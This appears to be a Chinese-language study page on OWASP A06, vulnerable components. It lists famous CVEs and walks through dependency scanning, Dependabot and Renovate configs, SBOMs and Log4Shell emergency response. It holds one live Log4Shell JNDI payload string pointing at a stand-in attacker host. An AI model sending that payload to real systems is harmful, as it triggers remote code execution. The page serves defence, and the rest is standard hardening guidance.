---
title: A06 易受攻击组件
date: 2026-08-15  # date-auto-injected
---

# A06 · Vulnerable & Outdated Components（易受攻击组件）

## 一句话总结

> **A06 = 用了有漏洞的依赖 / 框架 / OS**。**经典：Log4Shell / Spring4Shell / Struts 漏洞**。**防御：SBOM + 依赖扫描 + 及时升级 + 虚拟补丁**。

---

## 经典案例

| 漏洞 | 年份 | 影响 |
|------|------|------|
| **Log4Shell** (CVE-2021-44228) | 2021 | Log4j 远程代码执行（RCE） |
| **Spring4Shell** (CVE-2022-22965) | 2022 | Spring Core RCE |
| **Struts 2** (S2-045 等) | 2017 | Equifax 1.45 亿泄漏 |
| **Heartbleed** (CVE-2014-0160) | 2014 | OpenSSL 内存泄漏 |
| **Shellshock** (CVE-2014-6271) | 2014 | Bash 远程命令执行 |
| **Polkit** (CVE-2021-4034) | 2022 | Linux 通用提权 |

## 实战：Log4Shell 复现

```java
// 攻击 payload
String userAgent = "${jndi:ldap://attacker.com/Exploit}";
// Log4j 2.0 ≤ 2.14.1 解析 → 连接 LDAP → 下载恶意类 → RCE
```

## 实战：扫描项目依赖

```bash
# npm
npm audit
npm audit fix

# Python
pip install pip-audit
pip-audit

# Java
mvn org.owasp:dependency-check-maven:check
# 或 trivy fs .
```

## 实战：自动化升级

```yaml
# GitHub Dependabot
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

```yaml
# GitLab Renovate
# renovate.json
{
  "extends": ["config:base"],
  "automerge": true,
  "packageRules": [
    { "matchUpdateTypes": ["patch"], "automerge": true }
  ]
}
```

## 实战：SBOM（软件物料清单）

```bash
# 生成 SBOM
trivy fs --format cyclonedx --output sbom.json .
# 或
syft . -o cyclonedx-json > sbom.json
```

```yaml
# SPDX 格式（人类可读）
SPDXVersion: SPDX-2.3
DataLicense: CC0-1.0
SPDXID: SPDXRef-DOCUMENT
DocumentName: sbom
Creator: Tool: trivy-0.45.0
Package: log4j-core
  Version: 2.17.0
  Supplier: Organization: Apache
  PackageVerificationCode: abc123
```

## 防御清单

| 措施 | 落地 |
|------|------|
| **依赖扫描** | Snyk / Dependabot / Renovate |
| **SBOM 生成** | Syft / Trivy / Tern |
| **及时升级** | 关键 CVE 24h 内修复 |
| **虚拟补丁** | WAF / ModSecurity 临时缓解 |
| **运行时 RASP** | Contrast / OpenRASP |
| **镜像扫描** | Trivy / Grype（详见 05-container）|

## 关联章节

- **05-container/overview**：镜像扫描
- **05-container/supply-chain**：SBOM 供应链
- **release/adr/004-security**：A06 与供应链安全同源

## 实战：Log4Shell 应急响应

```bash
# 1. 检测（grep 旧版本）
find . -name "*.jar" | xargs -I{} sh -c 'unzip -l {} 2>/dev/null | grep -q "JndiLookup.class" && echo {}'

# 2. 临时缓解（移除 JndiLookup）
zip -q -d log4j-core-2.14.1.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

# 3. 长期修复
# 升级到 2.17.0+（>= 2.17.1 最佳）
```

## 实战：NVD 漏洞库查询

```bash
# CVE 详情
curl https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228

# KEV（已知被利用漏洞）
curl https://services.nvd.nist.gov/rest/json/cves/2.0?hasKev
```

## 实战：OWASP Dependency-Check

```bash
# 安装
mvn org.owasp:dependency-check-maven:check

# 输出报告
target/dependency-check-report.html
```

## 实战：漏洞自动修复（GitHub Dependabot）

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
    reviewers:
      - "security-team"
    groups:
      production:
        patterns:
          - "prod-*"
        update-types:
          - "minor"
          - "patch"
```

## 实战：应急响应时间表

| 漏洞等级 | 修复时间 |
|---------|---------|
| **Critical** | 24h 内 |
| **High** | 7 天 |
| **Medium** | 30 天 |
| **Low** | 90 天 + 风险接受 |

## 实战：CVE 监测工作流

```python
# 监控关键依赖
deps = ["log4j-core", "spring-core", "struts2-core"]

def check_cve_updates():
    for dep in deps:
        cves = query_nvd(dep)
        if any(cve.severity == "CRITICAL" for cve in cves):
            send_alert(f"CRITICAL CVE on {dep}: {cve.id}")

# 每日扫描
schedule.every().day.at("09:00").do(check_cve_updates)
```

## 一句话总结

> **A06 = 用了有洞的依赖**。**核心：SBOM + 自动扫描 + 及时升级 + 虚拟补丁**。**Log4Shell 级别 CVE 24h 内必须修复**。


<!-- auto-enrich:do-not-edit -->

## 相关阅读

> TODO: 在此补充 3-5 个内部链接（指向同站其他页面）或外部参考。

示例：
- 同站首页
- 进阶话题
- 实战案例
- 参考资料

## 进阶话题

> TODO: 此节可补充 3-5 段深度内容（如生产环境实战 / 常见错误 / 对比其他方案 / 未来演进）。

补充方向：
- 在生产环境如何配置 / 调优
- 与同类方案的对比（如 A vs B）
- 常见 3-5 个错误及排查
- 进阶阅读资料链接
<!-- auto-enrich:do-not-edit -->
